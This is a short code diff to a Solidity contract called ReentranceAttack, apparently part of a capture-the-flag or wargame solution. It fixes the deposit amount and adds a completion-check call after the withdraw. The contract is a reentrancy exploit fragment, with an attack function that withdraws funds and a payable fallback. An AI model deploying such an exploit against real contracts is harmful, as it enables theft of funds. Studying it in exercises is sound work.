@@ -16,11 +16,12 @@ contract ReentranceAttack{
     }
 
     function deposit() public payable {
-        re.deposit.value(msg.value)();
+        re.deposit.value(1000000000000000 wei)();
     }
 
     function attack() public {
         re.withdraw(1000000000000000 wei);
+        re.isCompleted();
     }
 
     function () public payable {
